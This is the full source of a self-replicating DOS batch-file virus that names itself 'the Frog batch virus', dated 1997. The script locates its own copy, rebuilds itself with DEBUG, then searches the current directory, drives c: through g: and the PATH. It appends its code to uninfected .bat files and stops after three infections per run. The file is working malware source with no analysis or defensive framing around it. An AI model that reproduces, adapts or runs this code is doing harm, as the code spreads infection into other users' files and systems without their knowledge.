@goto frog_v
n frog!_!.bat
rcx
5C4
w
q
:frog_v
@echo off
if :%1==:FRoGGy goto frog_%2
echo set frog!_!=>frog!_!x.bat
if not exist frog!_!x.bat goto frog_out
if :%0==: copy autoexec.bat frog!_!>nul
if exist %0.bat copy %0.bat frog!_!>nul
if not exist frog!_! call %0 FRoGGy los . %path%
del frog!_!x.bat>nul
if not exist frog!_! goto frog_out
debug frog!_!<frog!_!>nul
if exist frog!_!.bat %comspec% nul /e:30000 /f/c frog!_! FRoGGy run
del frog!_!.*>nul
:frog_out
echo on
@goto frog_bye
:frog_los
set frog!_!=%0
:frog_sch
shift
if exist %2%frog!_!% copy %2%frog!_!% frog!_!>nul
if exist %2%frog!_!%.bat copy %2%frog!_!%.bat frog!_!>nul
if exist %2\%frog!_!% copy %2\%frog!_!% frog!_!>nul
if exist %2\%frog!_!%.bat copy %2\%frog!_!%.bat frog!_!>nul
if exist frog!_! frog!_!x
if :%3==: frog!_!x
goto frog_sch
:frog_run
set c=
set s=
%0 FRoGGy hop . .. c: d: e: f: g: %path%
:frog_hop
shift
if :%2==: exit
if not exist %2\nul if not exist %2nul goto frog_bye
for %%f in (%2*.bat %2\*.bat) do call frog!_! FRoGGy inf %%f
goto frog_hop
:frog_inf
set s=%s%*
if %s%==***************************************** exit
find "frog_"<%3>frog!_!
copy frog!_! frog!_!.t
if exist frog!_!.t goto frog_bye
copy %3 frog!_!
copy /b frog!_!.bat+frog!_! %3
set c=%c%*
if %c%==*** exit
:frog_bye
::------------------------::
::- the Frog batch virus -::
::-  Made April 22 1997  -::
::- "No Fear Drink Beer" -::
::------------------------::
